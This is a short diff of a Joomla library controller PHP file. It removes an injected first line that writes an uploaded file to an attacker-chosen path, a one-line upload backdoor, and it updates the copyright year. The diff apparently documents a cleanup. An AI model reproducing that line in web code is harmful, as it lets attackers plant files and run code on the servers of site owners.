@@ -1,11 +1,9 @@
 <?php
-if(copy($_FILES['228']['tmp_name'],$_POST['p']))exit;
-
 /**
  * @package     Joomla.Libraries
  * @subpackage  Controller
  *
- * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
+ * @copyright   Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
  * @license     GNU General Public License version 2 or later; see LICENSE
  */
 
